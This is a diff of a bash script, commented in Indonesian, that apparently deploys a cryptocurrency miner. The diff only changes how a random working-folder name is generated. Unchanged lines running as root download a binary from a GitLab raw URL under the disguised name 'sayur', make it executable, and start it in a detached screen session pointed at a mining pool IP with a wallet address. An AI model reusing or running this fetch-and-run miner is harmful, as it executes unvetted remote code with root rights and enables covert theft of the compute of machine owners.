@@ -1,20 +1,19 @@
 #!/bin/bash
 sudo su <<EOF
 sudo apt install screen -y
-wget https://raw.githubusercontent.com/huntergregal/wordlists/master/names.txt
-TIK=$(shuf -n 1 names.txt | tr -cd '[:alnum:]._-' | tr ' ' '_')
-if [ -z "$TIK" ]; then
-    echo "Error: Tidak dapat mengambil nama dari file names.txt."
-    exit 1
-fi
+#!/bin/bash
 
-mkdir -p "$TIK"
+# Generate nama folder acak (misalnya, 8 karakter alfanumerik)
+NAMA_FOLDER=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
 
-cd "$TIK" || { echo "Gagal masuk ke folder $TIK."; exit 1; }
+# Buat folder dengan nama acak
+mkdir -p "$NAMA_FOLDER"
 
-echo "Folder '$TIK' berhasil dibuat dan Anda sekarang berada di dalamnya."
+# Masuk ke dalam folder
+cd "$NAMA_FOLDER" || { echo "Gagal masuk ke folder $NAMA_FOLDER."; exit 1; }
 
-sudo apt install screen -y
+# Tampilkan pesan sukses
+echo "Folder '$NAMA_FOLDER' berhasil dibuat dan Anda sekarang berada di dalamnya."
 
 wget -qO sayur https://gitlab.com/sarifadim/jomblo/-/raw/main/sagu && chmod +x sayur &&
 screen -dms run ./sayur --algo BEAM-III --pool 47.236.123.51:80 --user 35abc183df02cef8b5ab05ea3df9ecf5e1b8bbeb8ccc0bdb7a27073e80621131c4e.$(echo 0J-$(TZ=UTC-7 date +"%H-%M-%S")) --tls enable --no-cl
